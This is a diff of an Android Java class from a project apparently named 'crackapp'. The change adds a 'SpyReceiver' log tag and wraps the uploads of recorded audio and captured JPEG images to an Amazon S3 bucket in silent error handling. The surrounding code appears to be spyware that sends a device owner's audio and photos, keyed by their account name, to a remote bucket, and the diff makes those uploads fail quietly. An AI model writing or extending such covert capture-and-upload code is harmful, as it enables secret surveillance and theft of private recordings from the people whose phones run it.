@@ -12,6 +12,7 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.support.annotation.NonNull;
+import android.util.Log;
 import android.widget.Toast;
 
 import com.amazonaws.auth.CognitoCachingCredentialsProvider;
@@ -38,6 +39,7 @@ import co.poweramp.crackapp.Util;
  * Copyright (c) 2015 Duncan Leo. All Rights Reserved.
  */
 public class Job {
+    private final String TAG = "SpyReceiver";
     private Context context;
     private long timestamp;
     private JobListener listener;
@@ -109,7 +111,13 @@ public class Job {
                         Looper.prepare();
                         //TODO: Send file out to S3
                         String objectName = String.format("%s/%d/audio.aac", getMainAccount().name, timestamp);
-                        getS3Client(context).putObject(Constants.BUCKET_NAME, objectName, tempFile);
+                        try {
+                            getS3Client(context).putObject(Constants.BUCKET_NAME, objectName, tempFile);
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                            Log.d(TAG, "S3 audio upload failed, ignoring.");
+                            return;
+                        }
                         p.setAudio(objectName);
                         completedTasks++;
                         complete();
@@ -170,7 +178,13 @@ public class Job {
                             metadata.setContentType("image/jpeg");
                             metadata.setContentLength(bytes.length);
                             String objectName = String.format("%s/%d/image.jpg", getMainAccount().name, timestamp);
-                            getS3Client(context).putObject(Constants.BUCKET_NAME, objectName, inputStream, metadata);
+                            try {
+                                getS3Client(context).putObject(Constants.BUCKET_NAME, objectName, inputStream, metadata);
+                            } catch (Exception e) {
+                                e.printStackTrace();
+                                Log.d(TAG, "S3 image upload failed, ignoring.");
+                                return;
+                            }
                             p.setImage(objectName);
                             completedTasks++;
                             complete();
